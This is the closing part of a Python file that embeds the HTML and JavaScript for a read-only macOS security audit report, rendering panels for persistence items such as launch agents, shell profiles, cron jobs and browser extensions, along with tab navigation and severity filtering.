    html += card("Log lines mentioning threats or scans", "", (mb.log_lines || []).length ? '<div class="logbox">' + esc(mb.log_lines.join("\n")) + "</div>" : empty("No matching lines", " No readable log mentioned threats, quarantine or scans."));
    return html;
  }

  function renderPersistence() {
    var p = R.persistence || {};
    var STATUS = { "new": ["New", "new"], changed: ["Changed", "warn"], removed: ["Removed", ""], unchanged: ["Unchanged", "ok"], baseline: ["Baseline", ""] };
    function st(r) { var s = STATUS[r.status] || [r.status, ""]; return tag(s[0], s[1]); }
    var stSort = function (r) { return { "new": 0, changed: 1, removed: 2, baseline: 3, unchanged: 4 }[r.status]; };
    var html = '<div class="kpis">' +
      kpi("Launch agents", (p.launch_items || []).length, "User and system-wide") +
      kpi("Shell profiles", (p.shell_files || []).length, "Hashed and scanned") +
      kpi("Browser extensions", (p.extensions || []).length, "Chrome, Brave, Edge, Firefox") +
      kpi("Changes since baseline", p.changes_count || 0, p.baseline_date ? "Baseline from " + p.baseline_date : "", (p.changes_count || 0) ? "warn" : "") +
      "</div>";
    html += card("Persistence findings", "Malware on a standard account must live in these places", findingsTable(moduleFindings("persistence"), false));
    html += card("Launch agents & daemons", "~/Library/LaunchAgents, /Library/LaunchAgents, /Library/LaunchDaemons", table([
      { label: "Status", key: "status", render: st, sort: stSort },
      { label: "Label", key: "label", cls: "wrap", render: function (r) { return esc(r.label) + '<div class="detail mono">' + esc(r.file) + "</div>"; } },
      { label: "Scope", key: "scope", render: function (r) { return tag(r.scope); } },
      { label: "Runs", key: "program", cls: "wrap", render: function (r) { return '<span class="mono">' + esc(r.program || "—") + "</span>"; } }
    ], p.launch_items || [], "No launch items", ""));
    html += '<div class="grid-2">' + card("Shell profiles", "", table([
      { label: "Status", key: "status", render: st, sort: stSort },
      { label: "File", key: "file", render: function (r) { return '<span class="mono">' + esc(r.file) + "</span>"; } },
      { label: "Suspicious lines", key: "suspicious", render: function (r) { return (r.suspicious || []).length ? tag(r.suspicious.length + " match", "bad") : '<span class="faint">None</span>'; }, sort: function (r) { return -(r.suspicious || []).length; } }
    ], p.shell_files || [], "No shell profiles", "")) +
      card("Scheduled jobs (crontab)", "", (p.crontab || []).length ? '<div class="logbox">' + esc(p.crontab.join("\n")) + "</div>" : empty("No cron jobs", " This account has no crontab entries.")) + "</div>";
    html += card("Browser extensions", "", table([
      { label: "Status", key: "status", render: st, sort: stSort },
      { label: "Browser", key: "browser" },
      { label: "Extension", key: "name", cls: "wrap", render: function (r) { return esc(r.name) + '<div class="detail mono">' + esc(r.id) + "</div>"; } },
      { label: "Version", key: "version" }
    ], p.extensions || [], "No extensions found", ""));
    return html;
  }

  var RENDER = { overview: renderOverview, network: renderNetwork, littlesnitch: renderLittleSnitch, gatekeeper: renderGatekeeper, malwarebytes: renderMalwarebytes, persistence: renderPersistence };

  // ---------- shell ----------
  var content = document.getElementById("content");
  content.innerHTML = MODULES.map(function (m) {
    return '<section class="panel" role="tabpanel" id="panel-' + m.id + '" aria-labelledby="tab-' + m.id + '" hidden>' + RENDER[m.id]() + "</section>";
  }).join("");

  document.getElementById("nav").innerHTML = MODULES.map(function (m) {
    var badge = "";
    if (m.id !== "overview") {
      var mf = moduleFindings(m.id), hh = countSev(mf, "high"), mm = countSev(mf, "medium");
      if (hh) badge = '<span class="nav-badge high" aria-label="' + hh + ' high">' + hh + "</span>";
      else if (mm) badge = '<span class="nav-badge medium" aria-label="' + mm + ' medium">' + mm + "</span>";
    }
    return '<button class="nav-btn" role="tab" id="tab-' + m.id + '" aria-controls="panel-' + m.id + '" data-goto="' + m.id + '">' + icon(m.id) + '<span class="nav-label">' + esc(m.label) + "</span>" + badge + "</button>";
  }).join("");

  var meta = R.meta || {};
  document.getElementById("meta").innerHTML =
    "<span>Host <b>" + esc(meta.hostname) + "</b></span><span>User <b>" + esc(meta.user) + "</b></span><span>macOS <b>" + esc(meta.macos_version) +
    "</b></span><span>Generated <b>" + fmtTime(meta.generated_at) + "</b></span>";
  document.getElementById("foot").innerHTML = "Read-only report. No admin rights used, no data leaves this Mac." + (meta.demo ? "<br><br>Showing demo data." : "");

  function show(id) {
    MODULES.forEach(function (m) {
      document.getElementById("panel-" + m.id).hidden = m.id !== id;
      document.getElementById("tab-" + m.id).setAttribute("aria-selected", String(m.id === id));
    });
    document.getElementById("panel-title").textContent = MOD_NAME[id];
    window.scrollTo(0, 0);
    if (history.replaceState) history.replaceState(null, "", "#" + id);
  }
  document.addEventListener("click", function (e) {
    var g = e.target.closest("[data-goto]");
    if (g) show(g.getAttribute("data-goto"));
    var c = e.target.closest("#sev-chips .chip");
    if (c) {
      var s = c.getAttribute("data-sev");
      document.querySelectorAll("#sev-chips .chip").forEach(function (x) { x.setAttribute("aria-pressed", String(x === c)); });
      document.getElementById("findings-body").innerHTML = findingsTable(s === "all" ? findings : findings.filter(function (f) { return f.severity === s; }), true);
    }
  });
  var start = (location.hash || "").slice(1);
  show(MOD_NAME[start] ? start : "overview");
})();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    main()
